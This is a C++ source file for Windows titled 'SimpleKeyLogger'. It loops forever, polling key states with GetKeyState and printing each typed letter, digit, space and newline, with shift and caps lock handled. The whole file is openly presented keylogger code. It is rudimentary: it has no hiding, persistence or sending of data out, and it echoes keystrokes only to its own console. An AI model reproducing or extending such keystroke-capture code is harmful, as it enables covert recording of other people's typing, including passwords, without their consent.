// SimpleKeyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>

int main() {
	char shiftNumbers[] = { ')', '!', '\"', '#', '$', '%', '^', '&', '*', '(' };

	int delay, initialDelay;
	SystemParametersInfo(SPI_GETKEYBOARDSPEED, 0, &delay, 0);
	SystemParametersInfo(SPI_GETKEYBOARDDELAY, 0, &initialDelay, 0);

	for (;;) {
		bool shift = GetKeyState(VK_SHIFT) < 0;
		bool caps = (GetKeyState(VK_CAPITAL) & 1) == 1;
		for (int i = 'A'; i <= 'Z'; i++) {
			if (GetKeyState(i) & 0x8000) {
				printf("%c", (shift ^ caps) ? i : (i | 0x20));
				Sleep(80);
				break;
			}
		}

		if (GetKeyState(VK_SPACE) < 0) {
			printf(" ");
			Sleep(80);
			continue;
		}

		if (GetKeyState(VK_RETURN) < 0) {
			printf("\n");
			Sleep(80);
			continue;
		}

		for (int i = '0'; i <= '9'; i++) {
			if (GetKeyState(i) & 0x8000) {
				printf("%c", shift ? shiftNumbers[i - '0'] : i);
				Sleep(80);
				break;
			}
		}

		Sleep(20);
	}
}

